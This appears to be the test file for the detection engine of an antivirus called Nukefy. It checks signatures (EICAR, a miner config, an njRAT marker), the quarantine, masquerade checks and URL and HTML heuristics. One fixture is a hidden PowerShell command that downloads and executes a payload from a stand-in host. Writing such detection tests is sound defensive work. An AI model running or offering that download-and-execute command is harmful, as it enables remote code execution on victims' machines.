'use strict';
/* Автономные тесты движка Nukefy (без Electron): node test/engine.test.js */
process.env.NUKEFY_DATA = process.env.NUKEFY_DATA || require('path').join(require('os').tmpdir(), 'nukefy-test-' + process.pid);
const assert = require('assert');
const fs = require('fs');
const fsp = fs.promises;
const path = require('path');
const os = require('os');
const crypto = require('crypto');

const { SignatureDB, knowledgeFor } = require('../src/main/engine/signatures');
const { FileScanner } = require('../src/main/engine/scanner');
const { Quarantine } = require('../src/main/engine/quarantine');
const { ThreatStore } = require('../src/main/engine/store');
const { Settings } = require('../src/main/engine/settings');
const { analyzeAutorun, checkHosts } = require('../src/main/engine/persistence');
const { listProcesses, analyzeProcesses } = require('../src/main/engine/procscan');
const { urlHeuristics, analyzeHtml } = require('../src/main/engine/webanalyze');
const { entropy, lev, isPe } = require('../src/main/engine/util');

const FIX = path.join(os.tmpdir(), 'nukefy-fix-' + process.pid);
let passed = 0, failed = 0;
async function t(name, fn) {
  try { await fn(); passed++; console.log('  ok  ' + name); }
  catch (e) { failed++; console.log('  FAIL ' + name + '\n      ' + (e && e.stack || e).split('\n').slice(0, 4).join('\n      ')); }
}

/* ---- хелперы v1.1.0 ---- */
const { parsePE, peHeuristics } = require('../src/main/engine/pe');
const { unzipEntries } = require('../src/main/engine/archives');
const zlib = require('zlib');
const EICAR_STR = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';
function fakePe(over = {}) {
  return { ok: true, is64: false, timestamp: 0, checksum: 0, sections: [], imports: [], overlay: { size: 0, entropy: 0 }, hasCert: false, ddCount: 0, ...over };
}
function makeZip(entries) {
  const locals = []; const centrals = []; let offset = 0;
  for (const [name, content] of entries) {
    const nb = Buffer.from(name); const data = Buffer.from(content);
    const comp = zlib.deflateRawSync(data);
    const lh = Buffer.alloc(30);
    lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(20, 4); lh.writeUInt16LE(8, 8);
    lh.writeUInt32LE(comp.length, 18); lh.writeUInt32LE(data.length, 22);
    lh.writeUInt16LE(nb.length, 26);
    locals.push(lh, nb, comp);
    const ch = Buffer.alloc(46);
    ch.writeUInt32LE(0x02014b50, 0); ch.writeUInt16LE(20, 4); ch.writeUInt16LE(20, 6); ch.writeUInt16LE(8, 10);
    ch.writeUInt32LE(comp.length, 20); ch.writeUInt32LE(data.length, 24); ch.writeUInt16LE(nb.length, 28);
    ch.writeUInt32LE(offset, 42);
    centrals.push(ch, nb);
    offset += 30 + nb.length + comp.length;
  }
  const cbuf = Buffer.concat(centrals);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0); eocd.writeUInt16LE(entries.length, 8); eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(cbuf.length, 12); eocd.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, cbuf, eocd]);
}

(async () => {
  await fsp.mkdir(FIX, { recursive: true });
  const db = new SignatureDB();
  assert.ok(db.load(), 'база сигнатур загружена');
  console.log('база: ' + db.version + ', правил: ' + db.signatures.length);

  await t('сигнатура EICAR ловится', async () => {
    const p = path.join(FIX, 'eicar.txt');
    await fsp.writeFile(p, 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*');
    const hits = db.match(await fsp.readFile(p), 'txt');
    assert.ok(hits.some((h) => h.sig.id === 'Win32.EICAR-Test'));
  });

  await t('майнер-конфиг со stratum ловится', async () => {
    const p = path.join(FIX, 'cfg.json');
    await fsp.writeFile(p, JSON.stringify({ url: 'stratum+tcp://pool.supportxmr.com:3333', user: '44abcd', pass: 'x' }));
    const hits = db.match(await fsp.readFile(p), 'json');
    assert.ok(hits.some((h) => h.sig.cat === 'miner'));
  });

  await t('njRAT-маркер ловится', async () => {
    const p = path.join(FIX, 'sample.bin');
    await fsp.writeFile(p, Buffer.concat([Buffer.from('MZ\x90\x00'), Buffer.alloc(200, 7), Buffer.from('njRAT v0.7d config'), Buffer.alloc(100, 3)]));
    const hits = db.match(await fsp.readFile(p), 'bin');
    assert.ok(hits.some((h) => h.sig.fam === 'njrat'));
  });

  await t('чистый файл не детектится', async () => {
    const p = path.join(FIX, 'clean.txt');
    await fsp.writeFile(p, 'обычный текстовый документ про погоду и котиков'.repeat(20));
    const hits = db.match(await fsp.readFile(p), 'txt');
    assert.strictEqual(hits.length, 0);
  });

  await t('энтропия и PE-магия', async () => {
    assert.ok(entropy(crypto.randomBytes(4096)) > 7.5);
    assert.ok(entropy(Buffer.alloc(4096, 0x41)) < 1);
    const pe = Buffer.alloc(256); pe[0] = 0x4d; pe[1] = 0x5a; pe.writeUInt32LE(0x80, 0x3c); pe[0x80] = 0x50; pe[0x81] = 0x45;
    assert.ok(isPe(pe));
    assert.ok(!isPe(Buffer.from('hello world')));
  });

  await t('полный проход сканера по фикстурам', async () => {
    const dir = path.join(FIX, 'scanroot');
    await fsp.mkdir(path.join(dir, 'sub'), { recursive: true });
    await fsp.writeFile(path.join(dir, 'eicar-com-test.txt'), 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*');
    await fsp.writeFile(path.join(dir, 'sub', 'pool.json'), '{"url":"stratum+ssl://xmr.pool:4444"}');
    await fsp.writeFile(path.join(dir, 'sub', 'readme.txt'), 'чистый файл');
    const settings = new Settings(); await settings.load();
    settings.data.cloud = { malwarebazaar: false, urlhaus: false, virustotal: 'off' };
    const found = [];
    const sc = new FileScanner({ db, settings: settings.data, scanId: 't1', roots: [dir], cloud: false, onEvent: (e) => { if (e.type === 'threat') found.push(e.threat); } });
    const r = await sc.run();
    assert.ok(r.stats.files >= 3, 'файлы пройдены: ' + r.stats.files);
    assert.ok(found.some((f) => f.cat === 'virus'), 'вирус найден');
    assert.ok(found.some((f) => f.cat === 'miner'), 'майнер найден');
    assert.strictEqual(found.filter((f) => f.path.endsWith('readme.txt')).length, 0, 'чистый не тронут');
  });

  await t('карантин: изоляция и восстановление без потерь', async () => {
    const q = await new Quarantine(path.join(FIX, 'quar')).init();
    const p = path.join(FIX, 'q-target.txt');
    const payload = crypto.randomBytes(5000);
    await fsp.writeFile(p, payload);
    const r = await q.quarantineFile(p, { title: 'test' });
    assert.ok(r.ok, 'изолировано');
    assert.ok(!fs.existsSync(p), 'оригинал удалён');
    const back = await q.restore(r.id);
    assert.ok(back.ok, 'восстановлено');
    assert.ok((await fsp.readFile(back.path)).equals(payload), 'байты совпадают');
  });

  await t('автозапуск: сиротские и маскировочные записи', async () => {
    const items = [
      { source: 'Реестр HKCU', key: 'HKCU\\...\\Run', name: 'upd', command: 'C:\\Users\\x\\AppData\\Local\\Temp\\svchost.exe', kind: 'registry' },
      { source: 'Реестр HKCU', key: 'HKCU\\...\\Run', name: 'gone', command: 'C:\\no\\such\\file.exe', kind: 'registry' },
      { source: 'Реестр HKCU', key: 'HKCU\\...\\Run', name: 'ok', command: '"C:\\Windows\\explorer.exe"', kind: 'registry' },
    ];
    const th = analyzeAutorun(items, db);
    assert.ok(th.some((x) => x.reason === 'masquerade'), 'маскарад найден');
    assert.ok(th.some((x) => x.reason === 'orphan'), 'сирота найдена');
    assert.ok(!th.some((x) => x.name === 'ok'), 'легитимная запись не тронута');
  });

  await t('hosts: подмена сайтов безопасности', async () => {
    const r = await checkHosts();
    assert.ok(r && typeof r.ok === 'boolean');
  });

  await t('процессы: маскарад системного имени', async () => {
    const procs = [{ pid: 1234, name: 'svchost.exe', path: 'C:\\Users\\x\\AppData\\Local\\Temp\\svchost.exe', cmd: '' }];
    const th = analyzeProcesses(procs, [], db);
    assert.ok(th.some((x) => x.title === 'Proc.Masquerade'));
    const live = await listProcesses();
    assert.ok(live.length > 0, 'живой список процессов не пуст');
  });

  await t('URL-эвристики', async () => {
    const f1 = urlHeuristics(new URL('http://192.168.0.7/login'));
    assert.ok(f1.some((f) => f.id === 'ip-host') && f1.some((f) => f.id === 'no-tls'));
    const f2 = urlHeuristics(new URL('https://gooogle.com/search'));
    assert.ok(f2.some((f) => f.id === 'typosquat'), 'тайпосквоттинг: ' + JSON.stringify(f2.map((x) => x.id)));
    const f3 = urlHeuristics(new URL('https://paypal-secure-verify.xyz/auth'));
    assert.ok(f3.some((f) => f.id === 'brand-spoof') && f3.some((f) => f.id === 'sus-tld'));
    const f4 = urlHeuristics(new URL('https://github.com/kayorissss/Nukefy'));
    assert.strictEqual(f4.length, 0, 'чистый домен без замечаний: ' + JSON.stringify(f4));
  });

  await t('HTML: майнер, трекеры, скрытый iframe', async () => {
    const html = `<html><head><script src="https://coinhive.com/lib/coinhive.min.js"></script>
    <script src="https://www.googletagmanager.com/gtag/js?id=1"></script>
    <script src="https://mc.yandex.ru/metrika/tag.js"></script>
    <iframe src="https://evil.example/x" style="display:none"></iframe></head><body></body></html>`;
    const r = analyzeHtml(html, 'https://site.example/');
    assert.ok(r.findings.some((f) => f.id === 'page-miner'), 'майнер');
    assert.ok(r.findings.some((f) => f.id === 'hidden-iframe'), 'скрытый iframe');
    assert.ok(r.trackers.length >= 2, 'трекеры: ' + r.trackers.join(','));
  });

  await t('база знаний: карточки семейств', async () => {
    for (const fam of ['eicar', 'xmrig', 'njrat', 'mimikatz', 'ransomware', 'hosts-hijack', 'generic']) {
      const k = knowledgeFor(fam);
      assert.ok(k && k.title && k.whatItDoes && k.firstSeen && k.whereFrom && k.whereGoes, 'карточка ' + fam);
    }
  });

  await t('хранилище угроз: действия', async () => {
    const settings = new Settings(); await settings.load();
    const q = await new Quarantine(path.join(FIX, 'quar2')).init();
    const store = new ThreatStore(path.join(FIX, 'threats.json'), { quarantine: q, settings, db });
    await store.init();
    const p = path.join(FIX, 'store-target.txt');
    await fsp.writeFile(p, 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*');
    const t1 = store.add({ source: 'file', cat: 'virus', sev: 1, fam: 'eicar', title: 'Win32.EICAR-Test', path: p, sha256: 'aa' });
    assert.strictEqual(store.active().length, 1);
    const r = await store.act(t1.id, 'quarantine');
    assert.ok(r.ok, 'карантин: ' + r.error);
    assert.strictEqual(store.get(t1.id).status, 'quarantined');
    assert.ok(!fs.existsSync(p));
    const t2 = store.add({ source: 'file', cat: 'virus', sev: 1, fam: 'eicar', title: 'X', path: p + '2' });
    await store.act(t2.id, 'ignore');
    assert.ok(store.isIgnored(t2), 'игнор работает');
  });

  await t('процессы: системные не детектятся (powershell, explorer, браузер)', async () => {
    const procs = [
      { pid: 1, name: 'powershell.exe', path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', cmd: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' },
      { pid: 2, name: 'Explorer.EXE', path: 'C:\\WINDOWS\\Explorer.EXE', cmd: 'C:\\WINDOWS\\Explorer.EXE' },
      { pid: 3, name: 'browser.exe', path: 'C:\\Program Files (x86)\\Yandex\\YandexBrowser\\Application\\browser.exe', cmd: '"C:\\Program Files (x86)\\Yandex\\YandexBrowser\\Application\\browser.exe" --type=crashpad-handler https://example.com/x' },
      { pid: 4, name: 'steamwebhelper.exe', path: 'C:\\Program Files (x86)\\Steam\\bin\\cef\\cef.win64\\steamwebhelper.exe', cmd: 'steamwebhelper.exe --type=renderer https://steam' },
    ];
    const th = analyzeProcesses(procs, [], db, { selfPaths: [] });
    assert.strictEqual(th.length, 0, 'ложных срабатываний нет: ' + JSON.stringify(th.map((x) => x.title)));
  });

  await t('процессы: скрытый powershell-загрузчик детектится', async () => {
    const procs = [{ pid: 9, name: 'powershell.exe', path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', cmd: 'powershell.exe -w hidden -nop IWR https://evil.example/payload -UseBasicParsing | iex' }];
    const th = analyzeProcesses(procs, [], db, {});
    assert.ok(th.some((x) => x.title === 'Proc.ScriptDropper'), 'дропер найден: ' + JSON.stringify(th));
  });

  await t('процессы: свой exe и zapret не детектятся', async () => {
    const procs = [
      { pid: 5, name: 'Nukefy.exe', path: 'C:\\Users\\u\\AppData\\Local\\Temp\\3Jh\\Nukefy.exe', cmd: 'Nukefy.exe' },
      { pid: 6, name: 'Zapret.exe', path: 'C:\\Users\\u\\AppData\\Roaming\\ZapretTwo\\Zapret.exe', cmd: 'Zapret.exe --tray' },
    ];
    const th = analyzeProcesses(procs, [], db, { selfPaths: ['C:\\Users\\u\\AppData\\Local\\Temp\\3Jh'] });
    assert.strictEqual(th.length, 0, JSON.stringify(th));
  });

  await t('hosts: телеметрия-sinkhole не угроза, блокировка AV — угроза', async () => {
    const { analyzeHostsText } = require('../src/main/engine/persistence');
    const ok = analyzeHostsText('45.155.204.190 copilot.microsoft.com\n45.155.204.190 mobile.events.data.microsoft.com\n');
    assert.strictEqual(ok.length, 0, 'телеметрия не помечена');
    const bad = analyzeHostsText('127.0.0.1 www.virustotal.com\n127.0.0.1 update.microsoft.com\n');
    assert.strictEqual(bad.length, 2, 'блокировка сайтов безопасности помечена');
  });

  await t('автозапуск: zapret доверенный, чужой Temp — нет', async () => {
    const items = [
      { source: 'Планировщик', key: 'zapret', name: 'Zapret.exe', command: 'C:\\Users\\u\\AppData\\Roaming\\ZapretTwo\\Zapret.exe --tray', kind: 'task' },
      { source: 'Реестр HKCU', key: 'HKCU\\...\\Run', name: 'x', command: 'C:\\Users\\u\\AppData\\Local\\Temp\\svchost.exe', kind: 'registry' },
    ];
    const th = analyzeAutorun(items, db);
    assert.ok(!th.some((x) => /Zapret/i.test(x.command || '')), 'zapret не помечен');
    assert.ok(th.some((x) => x.reason === 'masquerade'), 'чужой Temp помечен');
  });

  await t('PE-парсер: синтетический PE читается, мусор отклоняется', async () => {
    assert.equal(parsePE(Buffer.from('just some data')).ok, false);
    const buf = Buffer.alloc(1024);
    buf.write('MZ'); buf.writeUInt32LE(0x80, 0x3c);
    buf.writeUInt32LE(0x4550, 0x80);
    buf.writeUInt16LE(1, 0x86);
    buf.writeUInt32LE(0x60000000, 0x88);
    buf.writeUInt16LE(0xe0, 0x94);
    buf.writeUInt16LE(0x10b, 0x98);
    buf.writeUInt32LE(16, 0x98 + 92);
    const secOff = 0x80 + 24 + 0xe0;
    buf.write('.text', secOff, 'latin1');
    buf.writeUInt32LE(0x200, secOff + 8);
    buf.writeUInt32LE(0x1000, secOff + 12);
    buf.writeUInt32LE(0x200, secOff + 16);
    buf.writeUInt32LE(0x400, secOff + 20);
    buf.writeUInt32LE(0x60000020, secOff + 36);
    const pe = parsePE(buf);
    assert.equal(pe.ok, true);
    assert.equal(pe.sections.length, 1);
    assert.equal(pe.sections[0].name, '.text');
  });

  await t('PE: упаковщик и W+X → риск (не выше sev3)', async () => {
    const pe = fakePe({ sections: [{ name: 'UPX0', chars: 0xe0000060, rawSize: 100, entropy: 7.9 }], timestamp: 0x60000000 });
    const h = peHeuristics(Buffer.alloc(10), pe, { path: 'C:\\App\\app.exe', entropyAll: 6.9 });
    assert.ok(h.some((x) => x.title === 'Heur.PE.Packer'), 'упаковщик найден');
    assert.ok(h.every((x) => x.sev <= 3), 'не завышена опасность');
  });

  await t('PE: инъекция API — только с доп. признаком (анти-ФП)', async () => {
    const imports = [{ dll: 'kernel32.dll', funcs: ['VirtualAllocEx', 'WriteProcessMemory', 'CreateRemoteThread'] }];
    const clean = fakePe({ imports, timestamp: 0x60000000 });
    const legit = peHeuristics(Buffer.alloc(10), clean, { path: 'C:\\Program Files\\App\\app.exe', entropyAll: 5.1 });
    assert.equal(legit.some((x) => x.title === 'Heur.PE.Injection'), false, 'обычная программа не помечается');
    const tmp = peHeuristics(Buffer.alloc(10), clean, { path: 'C:\\Users\\u\\AppData\\Local\\Temp\\x.exe', entropyAll: 5.1 });
    assert.ok(tmp.some((x) => x.title === 'Heur.PE.Injection'), 'в Temp — помечается');
  });

  await t('ZIP: EICAR внутри архива находится сканером', async () => {
    const zip = makeZip([['readme.txt', 'hello'], ['virus.com', EICAR_STR]]);
    const ents = unzipEntries(zip);
    assert.equal(ents.length, 2);
    assert.equal(ents.find((e) => e.name === 'readme.txt').buf.toString(), 'hello');
    const zp = path.join(FIX, 'pack.zip');
    await fsp.writeFile(zp, zip);
    const settings = new Settings(); await settings.load();
    settings.data.cloud = { malwarebazaar: false, urlhaus: false, virustotal: 'off' };
    const found = [];
    const sc = new FileScanner({ db, settings: settings.data, scanId: 'z1', mode: 'custom', roots: [], singleFile: zp, cloud: false, onEvent: (e) => { if (e.type === 'threat') found.push(e.threat); } });
    await sc.run();
    assert.ok(found.some((f) => /EICAR/i.test(f.title)), 'EICAR в архиве найден');
    assert.ok(found.some((f) => String(f.path).includes('::')), 'путь указывает на запись архива');
  });

  await t('загрузочные секторы: нормальный MBR — тихо, зашифрованный — тревога', async () => {
    const { parseBootSectors } = require('../src/main/engine/persistence');
    const good = Buffer.alloc(1024, 0);
    good.write('NTFS    ', 3, 'latin1');
    good[510] = 0x55; good[511] = 0xaa;
    good.write('EFI PART', 512, 'latin1');
    const g = parseBootSectors(good);
    assert.equal(g.known, true); assert.equal(g.gpt, true); assert.equal(g.mbrSig, true);
    const evil = Buffer.concat([crypto.randomBytes(510), Buffer.from([0x55, 0xaa]), Buffer.alloc(512, 0)]);
    const e = parseBootSectors(evil);
    assert.equal(e.mbrSig, true); assert.equal(e.known, false);
    assert.ok(e.bootEntropy > 7.4, 'энтропия загрузочного кода высокая');
  });

  await t('журнал событий: запись, чтение, переживание перезапуска', async () => {
    const dir = await fsp.mkdtemp(path.join(FIX, 'st-'));
    const st = await new ThreatStore(path.join(dir, 't.json'), { settings: { get: () => ({}) } }).init();
    st.addEvent('detect', { title: 'X' });
    st.addEvent('action', { action: 'heal', title: 'X' });
    assert.equal(st.eventsList().length, 2);
    assert.equal(st.eventsList()[0].action, 'heal');
    await new Promise((r) => setTimeout(r, 150));
    const st2 = await new ThreatStore(path.join(dir, 't.json'), { settings: { get: () => ({}) } }).init();
    assert.equal(st2.eventsList().length, 2, 'журнал сохранён на диске');
  });

  await t('хеш-сигнатуры: EICAR по SHA-256 в индексе', async () => {
    assert.ok(db.hashIndex.size >= 1, 'индекс хешей загружен');
    assert.ok(db.hashIndex.has('275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f'));
  });

  await t('levenshtein', async () => {
    assert.strictEqual(lev('google', 'gooogle', 2), 1);
    assert.ok(lev('google', 'amazon', 2) > 2);
  });

  await fsp.rm(FIX, { recursive: true, force: true });
  console.log(`\nитог: ${passed} пройдено, ${failed} провалено`);
  process.exit(failed ? 1 : 0);
})().catch((e) => { console.error(e); process.exit(1); });
